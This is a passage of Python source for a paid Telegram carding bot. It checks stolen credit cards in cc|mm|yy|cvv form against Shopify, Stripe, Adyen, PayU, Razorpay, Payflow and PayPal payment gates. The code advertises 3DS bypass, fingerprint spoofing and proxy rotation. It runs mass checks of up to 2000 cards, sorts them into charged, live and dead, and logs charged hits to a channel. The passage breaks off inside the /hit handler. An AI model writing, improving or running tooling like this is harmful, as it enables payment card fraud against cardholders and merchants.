        f"[≡] /myplan » {body('Check your plan and expiry')}\n"
        f"[≡] /redeem » {body('Redeem KEY — activate plan')}\n"
        f"[≡] /plans » {body('View plans and pricing')}\n"
        f"──────────────────\n"
        f"[≡] {head('Proxy')} {pick(LINK_POOL)}\n"
        f"[≡] /proxy » {body('host:port:user:pass')}\n"
        f"[≡] /myproxy » {body('View saved proxies')}\n"
        f"[≡] /rmproxy » {body('Remove all proxies')}\n"
        f"──────────────────\n"
        f"[≡] {head('Owner')} {pick(CROWN_POOL)}\n"
        f"[≡] {body(OWNER_NAME)} » {body(OWNER_USERNAME)}</code>"
    )
    kb = {"inline_keyboard": [
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": random.choice(CROSS_POOL), "style": "danger"}],
    ]}
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data == "xd_contact")
async def cb_xd_contact(callback: types.CallbackQuery):
    await callback.answer()
    text = (
        f"<code>[≡] {head('Contact')} » {head('Support')} {pick(HEART_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Owner')}   » {body(OWNER_USERNAME)} {pick(GEM_POOL)}\n"
        f"[≡] {head('Name')}    » {body(OWNER_NAME)} {pick(CROWN_POOL)}\n"
        f"[≡] {head('Channel')} » {body(CHANNEL_LINK)} {pick(LINK_POOL)}\n"
        f"[≡] {head('Group')}   » {body(GROUP_LINK)} {pick(LINK_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Response')} {body('Usually within a few hours.')} {pick(TIME_POOL)}</code>"
    )
    kb = {"inline_keyboard": [
        [
            {"text": "Join Channel", "url": CHANNEL_LINK,
             "icon_custom_emoji_id": random.choice(FIRE_POOL), "style": "primary"},
            {"text": "Join Group", "url": GROUP_LINK,
             "icon_custom_emoji_id": random.choice(HEART_POOL), "style": "primary"},
        ],
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": random.choice(CROSS_POOL), "style": "danger"}],
    ]}
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data == "menu_profile")
async def cb_menu_profile(callback: types.CallbackQuery):
    await callback.answer()
    uid = callback.from_user.id
    display = callback.from_user.full_name or "Unknown"
    handle = f"@{callback.from_user.username}" if callback.from_user.username else "—"
    proxies = get_user_proxies(uid)
    count = len(proxies)
    try:
        role = auth.get_user_role(uid)
        expiry = auth.get_premium_expiry(uid)
    except Exception:
        role, expiry = "free", "N/A"
    plan = {"owner": "Owner", "admin": "Admin"}.get(role, f"Premium ({expiry})" if role == "premium" else "Free")
    if proxies:
        proxy_line = f"{digit(str(count))} {body('proxies')}"
        proxy_emoji = pick(STAR_POOL)
    else:
        proxy_line = body("Not Set")
        proxy_emoji = pick(CROSS_POOL)
    text = (
        f"<code>[≡] {head('Profile')} » {head('User Info')} {pick(CROWN_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Name')}    » {body(display)} {pick(HEART_POOL)}\n"
        f"[≡] {head('Handle')}  » {body(handle)} {pick(LINK_POOL)}\n"
        f"[≡] {head('ID')}      » {digit(str(uid))} {pick(GEM_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Role')}    » {body(plan)} {pick(STAR_POOL)}\n"
        f"[≡] {head('Expires')} » {digit(expiry) if expiry != 'N/A' else body('—')} {pick(TIME_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Proxies')} » {proxy_line} {proxy_emoji}\n"
        f"[≡] {head('Rank')}    » {body('Noob')} {pick(SLOT_EMOJI_ID)}\n"
        f"[≡] {head('Charged')} » {digit('0')} {pick(GEM_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Redeem')} » /redeem KEY {pick(GIFT_POOL)}\n"
        f"[≡] {head('Plans')}  » /plans {pick(ROCKET_POOL)}</code>"
    )
    kb = {"inline_keyboard": [
        [{"text": "My Plan", "callback_data": "xd_cmd:myplan",
          "icon_custom_emoji_id": random.choice(GEM_POOL), "style": "success"}],
        [{"text": "Back", "callback_data": "menu_back",
          "icon_custom_emoji_id": random.choice(CROSS_POOL), "style": "danger"}],
    ]}
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data.startswith("xd_cmd:"))
async def cb_xd_cmd_hint(callback: types.CallbackQuery):
    cmd = callback.data.split(":", 1)[1]
    hints = {
        "redeem": "Use /redeem KEY to activate your plan.",
        "myplan": "Use /myplan to see your plan.",
        "sh": "Usage: /sh cc|mm|yy|cvv",
        "msh": "Usage: /msh cc|mm|yy|cvv",
        "adyen": "Usage: /ady url cc|mm|yy|cvv",
        "hit": "Usage: /hit url cc|mm|yy|cvv",
        "proxy": "Usage: /proxy host:port:user:pass",
        "payu": "Usage: /payu cc|mm|yy|cvv",
        "rz": "Usage: /rz cc|mm|yy|cvv",
        "pf": "Usage: /pf cc|mm|yy|cvv",
        "pp": "Usage: /pp cc|mm|yy|cvv",
    }
    await callback.answer(hints.get(cmd, "Unknown command."), show_alert=True)


# ── GATE INFO ────────────────────────────────────────────────────────────────
GATE_INFO = {
    "shopify": {
        "title": "Shopify Gate", "cmd": "/sh cc|mm|yy|cvv", "cmd2": "/msh (reply .txt)",
        "gate": "Shopify Payments", "price": "$1 – $999",
        "features": ["Multi-site rotation with retry", "Auto-retry on dead sites",
                     "Live BIN info on every check", "3DS bypass supported",
                     "Charged / Approved / 3DS / Declined buckets", "Mass check via .txt reply"],
        "example": "/sh 4388540109154632|03|2030|815",
    },
    "stripe": {
        "title": "Stripe Checkout Hit", "cmd": "/hit <stripe_url> cc|mm|yy|cvv", "cmd2": "",
        "gate": "Stripe Checkout", "price": "Custom per link",
        "features": ["checkout.stripe.com/c/pay/...", "billing.stripe.com/p/session/...",
                     "invoice.stripe.com/i/...", "buy.stripe.com / pay.stripe.com",
                     "Custom domains with cs_live_ tokens", "Auto 3DS bypass — no proxy needed",
                     "Full BIN info on every hit"],
        "example": "/hit https://checkout.stripe.com/c/pay/... 4111|12|26|123",
    },
    "adyen": {
        "title": "Adyen Pay-by-Link", "cmd": "/ady <adyen_url> cc|mm|yy|cvv", "cmd2": "",
        "gate": "Adyen Checkout", "price": "Custom per link",
        "features": ["Pay-by-link bypass engine", "Live 3DS challenge handling",
                     "Cloudflare Worker 3DS fallback", "Real browser fingerprint spoofing",
                     "Requires user proxy", "Full BIN info on every check"],
        "example": "/ady https://eu.adyen.link/... 4111|12|26|123",
    },
    "payu": {
        "title": "PayU 1$ Gate", "cmd": "/payu cc|mm|yy|cvv", "cmd2": "",
        "gate": "PayU (ladnehistorie.pl)", "price": "$1 USD",
        "features": ["Auto-generated identity per check", "Full 3DS via headless Chrome",
                     "Own rotating proxy pool", "Detailed status codes on response",
                     "Charged / Approved / Declined detection"],
        "example": "/payu 4111111111111111|12|26|123",
    },
    "rz": {
        "title": "Razorpay 1₹ Gate", "cmd": "/rz cc|mm|yy|cvv", "cmd2": "",
        "gate": "Razorpay (razorpay.me)", "price": "₹1 INR",
        "features": ["Playwright browser automation", "3DS challenge auto-cancel",
                     "Own rotating proxy pool", "Region check (India blocked)",
                     "Handles pg_router responses"],
        "example": "/rz 4111111111111111|12|26|123",
    },
    "pf": {
        "title": "Payflow 5$ Gate", "cmd": "/pf cc|mm|yy|cvv", "cmd2": "",
        "gate": "Payflow (happyhillfarm.org)", "price": "$5 USD",
        "features": ["Simple HTTP checker", "Fast response (~15–30s)",
                     "CVV2 detection for approved", "Static proxy (rotating)",
                     "Direct charge attempt"],
        "example": "/pf 4111111111111111|12|26|123",
    },
    "pp": {
        "title": "PayPal 0.10$ CVV", "cmd": "/pp cc|mm|yy|cvv", "cmd2": "",
        "gate": "PayPal Commerce", "price": "$0.10 USD",
        "features": ["PayPal Commerce gateway", "CVV2 failure detection",
                     "Insufficient funds detection", "Detailed error codes (ISSUE)",
                     "Async aiohttp engine"],
        "example": "/pp 4111111111111111|12|26|123",
    },
}


@router.callback_query(F.data.startswith("gate_info:"))
async def cb_gate_info(callback: types.CallbackQuery):
    await callback.answer()
    key = callback.data.split(":", 1)[1]
    info = GATE_INFO.get(key)
    if not info:
        return
    icon_map = {
        "shopify": random.choice(GEM_POOL), "stripe": random.choice(BOLT_POOL),
        "adyen":   random.choice(HEART_POOL), "payu":   random.choice(ROCKET_POOL),
        "rz":      random.choice(STAR_POOL),  "pf":     random.choice(SPARKLE_POOL),
        "pp":      random.choice(GIFT_POOL),
    }
    header_icon = icon_map.get(key, random.choice(FIRE_POOL))
    features_lines = "\n".join(f"[≡] {pick(CHECK_POOL)} {body(f)}" for f in info["features"])
    cmd_line = f"/{body(info['cmd'].lstrip('/'))}"
    cmd2_line = f"\n[≡] {head('Bulk')} » {body(info['cmd2'])} {pick(LINK_POOL)}" if info["cmd2"] else ""
    text = (
        f"<code>[≡] {header_icon} {head(info['title'])} {pick(SPARKLE_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Command')} » {cmd_line} {pick(LINK_POOL)}{cmd2_line}\n"
        f"[≡] {head('Gateway')} » {body(info['gate'])} {pick(FIRE_POOL)}\n"
        f"[≡] {head('Price')}   » {body(info['price'])} {pick(GEM_POOL)}\n"
        f"──────────────────\n"
        f"[≡] {head('Features')} » {pick(STAR_POOL)}\n"
        f"{features_lines}\n"
        f"──────────────────\n"
        f"[≡] {head('Example')} » {pick(FIRE_POOL)}\n"
        f"{info['example']}</code>"
    )
    kb = {"inline_keyboard": [
        [
            {"text": "Copy Command", "callback_data": f"gate_copy:{key}",
             "icon_custom_emoji_id": random.choice(CHECK_POOL), "style": "success"},
            {"text": "Back", "callback_data": "menu_check",
             "icon_custom_emoji_id": random.choice(CROSS_POOL), "style": "danger"},
        ],
    ]}
    try:
        await safe_edit(callback.message, text, reply_markup=kb)
    except Exception:
        pass


@router.callback_query(F.data.startswith("gate_copy:"))
async def cb_gate_copy(callback: types.CallbackQuery):
    key = callback.data.split(":", 1)[1]
    info = GATE_INFO.get(key)
    if not info:
        await callback.answer()
        return
    await callback.answer(f"Command: {info['cmd']}", show_alert=True)# ══════════════════════════════════════════════════════════════════════════════
#  PART 4 — Result formatters + /sh single + /msh mass
# ══════════════════════════════════════════════════════════════════════════════

async def send_log_hit(response_text, amount, gate, checker_name):
    if not LOG_CHANNEL_ID:
        return
    try:
        msg = (
            f"[≡] {head('Charged Success')} » {pick(GEM_POOL)}\n"
            f"──────────────────────\n"
            f"[≡] {head('Response')} » {response_text}\n"
            f"──────────────────────\n"
            f"[≡] {head('Amount')} » ${amount} USD {pick(GEM_POOL)}\n"
            f"[≡] {head('Gate')} » {gate}\n"
            f"──────────────────────\n"
            f"[≡] {head('Checker')} » {pick(FIRE_POOL)} {checker_name} (off)"
        )
        await bot.send_message(LOG_CHANNEL_ID, msg, disable_notification=True)
    except Exception as e:
        log.warning("send_log_hit failed: %s", e)


def _is_charged(resp, result=None):
    rl = (resp or "").lower()
    if any(k in rl for k in ("order_placed", "order completed", "processedreceipt", "payment successful")):
        return True
    if "💎" in (resp or ""):
        return True
    if result and (result.get("Charged") == "True" or result.get("Code") == "ORDER_PLACED"):
        return True
    return False


_RESULT_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5999340396432333728",
    "❌": "6037570896766438989", "⚡": "6026367225466720832",
    "💳": "5971944878815317190", "💠": "5971837723676249096",
    "📝": "6023660820544623088", "🌐": "6026367225466720832",
    "🎯": "5974235702701853774", "🤖": "6057466460886799210",
    "💰": "5971944878815317190",
}


def _result_emoji(text):
    if not text:
        return text
    holders = []
    out = text
    for i, (glyph, eid) in enumerate(_RESULT_EMOJI_IDS.items()):
        token = f"\x00R{i:02d}\x00"
        holders.append((token, glyph, eid))
        out = out.replace(glyph, token)
    for token, glyph, eid in holders:
        out = out.replace(token, f'<tg-emoji emoji-id="{eid}">{glyph}</tg-emoji>')
    return out


def _result_badge(resp, result=None):
    rl = (resp or "").lower()
    if _is_charged(resp, result):
        return "✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
    if any(key in rl for key in (
        "approved", "insufficient", "incorrect_cvc", "invalid_cvc",
        "incorrect_cvv", "invalid_cvv", "incorrect_zip", "otp_required", "3ds",
    )):
        return "🔥", "𝐋𝐢𝐯𝐞"
    return "❌", "𝐃𝐞𝐚𝐝"


def _shopiii_checking_text(card):
    return _result_emoji(
        f"<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n"
        f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>"
    )


def _shopiii_result_text(card, status_emoji, status_text, response, gateway, price, bin_info):
    brand = bin_info.get("brand") or "-"
    bin_type = bin_info.get("type") or "-"
    level = bin_info.get("level") or "-"
    bank = bin_info.get("bank") or "-"
    country = bin_info.get("country") or "-"
    flag = bin_info.get("flag") or ""
    title = {"𝐂𝐡𝐚𝐫𝐠𝐞𝐝": "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅", "𝐋𝐢𝐯𝐞": "𝐋𝐢𝐯𝐞 🔥", "𝐃𝐞𝐚𝐝": "𝐃𝐞𝐜𝐥𝐢𝐧𝐞 ❌"}.get(status_text, "𝐒𝐢𝐭𝐞 𝐄𝐫𝐫𝐨𝐫 ⚠️")
    return _result_emoji(
        f"<b>⚡💠 {title}</b>\n"
        f"<blockquote>{status_emoji} Status: {status_text}</blockquote>\n"
        f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
        f"<blockquote>📝 Response: {str(response)[:150]}</blockquote>\n"
        f"<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway} | 💰 {price}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>\n"
        f"<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}\n"
        f"𝗕𝗮𝗻𝗸: {bank}\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n\n"
        f"🤖 <b>Bot By: {OWNER_NAME}</b>"
    )


def _fmt_elapsed(seconds):
    if seconds >= 60:
        m, s = divmod(seconds, 60)
        return f"{m}m {s}s"
    return f"{seconds}s"


def _shopiii_progress_text(total, charged, approved, dead, checked, gateway, elapsed):
    return _result_emoji(
        f"<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>\n"
        f"<blockquote>💳 Total: {total} | ✅ Charged: {charged} | 🔥 Live: {approved} | ❌ Dead: {dead}</blockquote>\n"
        f"<blockquote>📊 Checked: {checked}/{total}</blockquote>\n"
        f"<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>\n"
        f"<blockquote>⏱️ Time: {_fmt_elapsed(elapsed)}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>"
    )


def _shopiii_final_text(total, charged, approved, dead, gateway, elapsed):
    hits = [f"✅ <code>{c}</code>" for c in charged[:5]]
    hits.extend(f"🔥 <code>{c}</code>" for c in approved[:5])
    hits_text = "\n".join(hits) if hits else "No hits found"
    return _result_emoji(
        f"<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>\n"
        f"<blockquote>💳 Total: {total} | ✅ Charged: {len(charged)} | 🔥 Live: {len(approved)} | ❌ Dead: {dead}</blockquote>\n"
        f"<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>\n"
        f"<blockquote>⏱️ Time: {_fmt_elapsed(elapsed)}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n"
        f"<b>🎯💠 𝐇𝐢𝐭𝐬</b>\n"
        f"<blockquote>{hits_text}</blockquote>\n"
        f"<b>━━━━━━━━━━━━━━━━━</b>\n\n"
        f"🤖 <b>Bot By: {OWNER_NAME}</b>"
    )


def _bucket(resp, result=None):
    rl = (resp or "").lower()
    for k in ("timed out", "timeout", "connection", "proxy dead", "proxy error",
              "could not resolve", "ssl", "unreachable", "bad gateway",
              "gateway timeout", "service unavailable", "502", "503", "504",
              "site dead", "cloudflare", "access denied", "tunnel"):
        if k in rl:
            return "failed"
    if _is_charged(resp, result):
        return "charged"
    if "otp_required" in rl or "3ds" in rl or "challenge" in rl:
        return "3ds"
    if any(k in rl for k in ("insufficient_funds", "insufficient funds",
                              "incorrect_cvc", "invalid_cvc", "incorrect_cvv",
                              "invalid_cvv", "incorrect_zip")):
        return "approved"
    return "declined"


def _shopiii_txt_report(results, order):
    buckets = {"charged": [], "approved": [], "dead": []}
    for card in order:
        entry = results.get(card)
        if not entry:
            buckets["dead"].append((card, {}))
            continue
        result = entry.get("result", {})
        bucket = _bucket(result.get("Response", ""), result)
        target = "charged" if bucket == "charged" else "approved" if bucket in ("approved", "3ds") else "dead"
        buckets[target].append((card, result))
    lines = ["=" * 70, "⚡💳 CC CHECKER RESULTS 💳⚡",
             "Format: CC | Gateway | Price | Message", "=" * 70, ""]
    for title, icon, key in (("CHARGED", "✅", "charged"), ("APPROVED", "🔥", "approved"), ("DEAD", "❌", "dead")):
        lines.extend([f"{icon} {title} ({len(buckets[key])}):", "-" * 70])
        for card, result in buckets[key]:
            lines.append(f"{card} | {result.get('Gate', 'Unknown')} | {result.get('Price', '-')} | {str(result.get('Response', 'Unknown'))[:100]}")
        lines.append("")
    return "\n".join(lines)


def _result_text(cc, result, bin_info, user):
    resp = result.get("Response", "Unknown")
    gate = result.get("Gate", "-")
    price = result.get("Price", "-")
    status_emoji, status_text = _result_badge(resp, result)
    return _shopiii_result_text(cc, status_emoji, status_text, resp, gate, str(price), bin_info)


# ── /sh ──────────────────────────────────────────────────────────────────────
@router.message(Command("sh"))
async def cmd_sh(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb())
        return
    cc = None
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc = extract_cc(args[1])
        if not cc:
            parts = re.split(r"[|/]", args[1].strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
    if not cc and message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc = extract_cc(rt)
    if not cc:
        await message.reply(f"{pick(FIRE_POOL)} {bold('No CC found!')}\n\n{bold('Usage:')} /sh 4388540109154632|03|2030|815")
        return
    proxy = get_user_proxy(uid)
    if not proxy:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Proxy Set!')}\n\nUse: /proxy host:port:user:pass")
        return
    site = get_random_site()
    if not site:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No sites available!')}")
        return
    bin_num = cc.split("|")[0][:6]
    loading = await message.reply(_shopiii_checking_text(cc))
    _chk = asyncio.create_task(checker_bridge.check_card_site(cc, site, proxy))
    _bin = asyncio.create_task(bin_lookup(bin_num))
    try:
        result = await _chk
    except Exception as e:
        result = {"Response": str(e)[:80], "Price": "-", "Gate": "-"}
    bin_info = await _bin
    await safe_edit(loading, _result_text(cc, result, bin_info, message.from_user))
    resp = result.get("Response", "")
    if _is_charged(resp, result):
        try:
            await bot.pin_chat_message(message.chat.id, loading.message_id, disable_notification=True)
        except Exception:
            pass
        await send_log_hit(resp[:80], str(result.get("Price", "-")), result.get("Gate", "-"), message.from_user.full_name or "Unknown")


# ── /msh ─────────────────────────────────────────────────────────────────────
MSH_MAX = 2000
_msh_locks = {}
_user_sems = {}


def _user_sem(uid):
    if uid not in _user_sems:
        _user_sems[uid] = asyncio.Semaphore(50)
    return _user_sems[uid]


async def _msh_one(cc, proxy, status_msg, results, order, user, user_id, sites, started):
    site = random.choice(sites)
    bin_num = cc.split("|")[0][:6]
    _bin = asyncio.create_task(bin_lookup(bin_num))
    sem = _user_sem(user_id)
    async with sem:
        try:
            result = await checker_bridge.check_card_site(cc, site, proxy)
        except Exception as e:
            result = {"Response": str(e)[:80], "Price": "-", "Gate": "-"}
    bin_info = await _bin
    results[cc] = {"result": result, "bin": bin_info}
    mid = status_msg.message_id
    if mid not in _msh_locks:
        _msh_locks[mid] = asyncio.Lock()
    async with _msh_locks[mid]:
        done = sum(1 for c in order if c in results)
        total = len(order)
        n_charged = sum(1 for c in order if c in results and _bucket(results[c]["result"].get("Response", ""), results[c]["result"]) == "charged")
        n_approved = sum(1 for c in order if c in results and _bucket(results[c]["result"].get("Response", ""), results[c]["result"]) == "approved")
        n_3ds = sum(1 for c in order if c in results and _bucket(results[c]["result"].get("Response", ""), results[c]["result"]) == "3ds")
        gateway = result.get("Gate", "Unknown")
        text = _shopiii_progress_text(total, n_charged, n_approved + n_3ds, done - n_charged - n_approved - n_3ds, done, gateway, int(time.time() - started))
        try:
            await safe_edit(status_msg, text)
        except Exception:
            pass
    if sum(1 for c in order if c in results) == len(order):
        _msh_locks.pop(mid, None)
    bucket = _bucket(results[cc]["result"].get("Response", ""), results[cc]["result"])
    if bucket in ("charged", "approved"):
        status_emoji, status_text = (("✅", "𝐂𝐡𝐚𝐫𝐠𝐞𝐝") if bucket == "charged" else ("🔥", "𝐋𝐢𝐯𝐞"))
        try:
            await bot.send_message(status_msg.chat.id, _shopiii_result_text(cc, status_emoji, status_text, results[cc]["result"].get("Response", "Unknown"), results[cc]["result"].get("Gate", "Unknown"), str(results[cc]["result"].get("Price", "-")), bin_info))
        except Exception:
            pass
    if bucket == "charged":
        await send_log_hit(results[cc]["result"].get("Response", "")[:80], str(results[cc]["result"].get("Price", "-")), results[cc]["result"].get("Gate", "-"), user.full_name or "Unknown")


@router.message(Command("msh"))
async def cmd_msh(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb())
        return
    raw = message.text.split(maxsplit=1)[1] if " " in message.text else ""
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt
    if not raw.strip():
        await message.reply(f"{pick(FIRE_POOL)} {bold('Usage:')} /msh cc|mm|yy|cvv ...")
        return
    ccs = []
    for m in CC_PATTERN.finditer(raw):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in ccs:
            ccs.append(cc)
    if not ccs:
        for line in raw.strip().splitlines():
            parts = re.split(r"[|/]", line.strip())
            if len(parts) >= 4:
                cc = "|".join(p.strip() for p in parts[:4])
                if cc not in ccs:
                    ccs.append(cc)
    if not ccs:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No valid CCs found!')}")
        return
    ccs = ccs[:MSH_MAX]
    proxy = get_user_proxy(uid)
    if not proxy:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Proxy Set!')} /proxy")
        return
    sites = _load_sites()
    if not sites:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No sites available!')}")
        return
    total = len(ccs)
    started = time.time()
    status = await message.reply(_shopiii_progress_text(total, 0, 0, 0, 0, "Unknown", 0))
    results = {}
    order = list(ccs)
    await asyncio.gather(*[asyncio.create_task(_msh_one(c, proxy, status, results, order, message.from_user, uid, sites, started)) for c in ccs], return_exceptions=True)
    elapsed = int(time.time() - started)
    charged_list, approved_list, threeds_list, failed_list = [], [], [], []
    declined_count = 0
    for cc in order:
        if cc not in results:
            declined_count += 1
            continue
        r = results[cc]["result"]
        b = _bucket(r.get("Response", ""), r)
        if b == "charged": charged_list.append(cc)
        elif b == "approved": approved_list.append(cc)
        elif b == "3ds": threeds_list.append(cc)
        elif b == "failed": failed_list.append(cc)
        else: declined_count += 1
    approved_plus_3ds = len(approved_list) + len(threeds_list)
    failed_count = len(failed_list)
    declined_total = declined_count + failed_count
    try:
        await status.delete()
    except Exception:
        pass
    gateway = "Unknown"
    for card in charged_list + approved_list + threeds_list:
        if card in results:
            gateway = results[card]["result"].get("Gate", "Unknown")
            break
    try:
        sent = await message.reply(_shopiii_final_text(total, charged_list, approved_list + threeds_list, declined_total, gateway, elapsed))
        try:
            await bot.pin_chat_message(message.chat.id, sent.message_id, disable_notification=True)
        except Exception:
            pass
    except Exception:
        pass
    try:
        await bot.send_document(message.chat.id, types.BufferedInputFile(_shopiii_txt_report(results, order).encode("utf-8"), filename="results.txt"))
    except Exception as e:
        log.warning("results.txt send failed: %s", e)
    if approved_plus_3ds > 0:
        live_body = (f"[≡] Live Hits » Approved + 3DS » ◻\n[≡] Approved » {len(approved_list)}\n[≡] 3DS » {len(threeds_list)}\n\n" + "\n".join(approved_list + threeds_list))
        try:
            await bot.send_document(message.chat.id, types.BufferedInputFile(live_body.encode("utf-8"), filename="live.txt"))
        except Exception as e:
            log.warning("live.txt send failed: %s", e)
    if failed_count > 0:
        err_body = f"[≡] Failed Cards » {failed_count} cards » 💀\n\n" + "\n".join(failed_list)
        try:
            await bot.send_document(message.chat.id, types.BufferedInputFile(err_body.encode("utf-8"), filename=f"error_{uid}.txt"))
        except Exception as e:
            log.warning("error_%s.txt send failed: %s", uid, e)
    if charged_list:
        try:
            await bot.send_message(message.chat.id, f"{pick(GEM_POOL)} {bold('Charged hits:')} {bold(str(len(charged_list)))}\n" + "\n".join(f"<tg-spoiler>{c}</tg-spoiler>" for c in charged_list[:20]))
        except Exception:
            pass# ══════════════════════════════════════════════════════════════════════════════
#  PART 5 — /hit, /ady, proxy, single gates
# ══════════════════════════════════════════════════════════════════════════════

HIT_MAX = 10
_hit_active = set()
ADYEN_MAX = 10
_adyen_active = set()


@router.message(Command("hit"))
async def cmd_hit(message: types.Message):
    if not await check_user_joined(message.from_user.id):
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    uid = message.from_user.id
    if auth.is_banned(uid):
        return
    if not has_active_plan(uid, message.chat.id):
        await message.reply(access_denied_msg(uid), reply_markup=access_denied_kb())
        return
    if uid in _hit_active:
        await message.reply(f"{pick(FIRE_POOL)} {bold('Your Stripe check is already in progress!')}")
        return
    raw = message.text.split(maxsplit=1)[1] if " " in message.text else ""
    if message.reply_to_message:
        rt = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw = (raw + "\n" + rt).strip() if raw else rt
    if not raw.strip():
        await message.reply(
            f"<code>[≡] {head('Stripe Hitter')} » {head('Direct Charge')} {pick(BOLT_POOL)}\n"
            f"──────────────────\n"
            f"[≡] {head('Usage')} » /hit url cc|mm|yy|cvv\n"
            f"[≡] {head('Reply')} » {body('Reply to a Stripe link then /hit cards')}\n"
            f"──────────────────\n"
            f"[≡] {head('Supported')} » {pick(LINK_POOL)}\n"
            f"  • checkout.stripe.com/c/pay/...\n"
            f"  • billing.stripe.com/p/session/...\n"
            f"  • invoice.stripe.com/i/...\n"
            f"  • buy.stripe.com/...\n"
            f"  • Custom domain with cs_live_ token</code>"
        )
        return
    link_match = re.search(r"https?://[^\s]*(?:checkout\.stripe\.com|billing\.stripe\.com|invoice\.stripe\.com|payment\.stripe\.com|pay\.stripe\.com|buy\.stripe\.com|cs_(?:live|test)_|plink_(?:live|test)_)[^\s]*", raw, re.IGNORECASE)
    if not link_match:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No Stripe link found!')}")
        return
    checkout_url = link_match.group(0)
    ccs = []
    for m in CC_PATTERN.finditer(raw):
        cc = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if cc not in ccs:
            ccs.append(cc)
    if not ccs:
        await message.reply(f"{pick(CROSS_POOL)} {bold('No valid CCs found!')}")
        return
    ccs = ccs[:HIT_MAX]
    _hit_active.add(uid)
    total = len(ccs)
    results = {}
    order = list(ccs)
    user_name = message.from_user.full_name or "Unknown"
    init_lines = [f"{pick(BOLT_POOL)} {bold('Stripe Hitter')} [0/{total}]\n", f"{pick(GEM_POOL)} {bold('URL:')} {bold(checkout_url[:55])}", ""]
    for c in ccs:
        init_lines.append(f"{pick(TIME_POOL)} <tg-spoiler>{c}</tg-spoiler> checking...")
    init_lines.append(f"\n{pick(FIRE_POOL)} {bold('Checked by:')} {user_name}")
    status = await message.reply("\n\n".join(init_lines))
    try:
        for cc in order:
            try:
                result = await asyncio.get_running_loop().run_in_executor(CHECKER_POOL, hit.run_hit_check, checkout_url, cc)
            except Exception as e:
                result = {"ok": False, "error": str(e)[:80]}
            results[cc] = result
            ok = result.get("ok", False)
            rstatus = (result.get("result_status") or "").lower()
            if not ok:
                line = f"{pick(CROSS_POOL)} {bold((result.get('error') or 'Failed')[:55])}"
            elif rstatus == "charged":
                line = f"{pick(GEM_POOL)} {bold('Charged Success')}"
            elif rstatus == "approved":
                line = f"{pick(CHECK_POOL)} {bold('Live — ' + (result.get('result_msg') or '')[:50])}"
            elif result.get("session_dead"):
                line = f"{pick(CROSS_POOL)} {bold('Session Dead')}"
            else:
                line = f"{pick(CROSS_POOL)} {bold((result.get('result_msg') or 'Declined')[:50])}"
            results[cc]["_line"] = line
            lines = [f"{pick(BOLT_POOL)} {bold('Stripe Hitter')} [{sum(1 for c in order if c in results)}/{total}]\n"]
            lines.append(f"{pick(GEM_POOL)} {bold('URL:')} {bold(checkout_url[:55])}")
            lines.append("")
            for c in order:
                if c in results:
                    lines.append(f"{results[c]['_line']}\n{pick(GEM_POOL)} <tg-spoiler>{c}</tg-spoiler>")
                else:
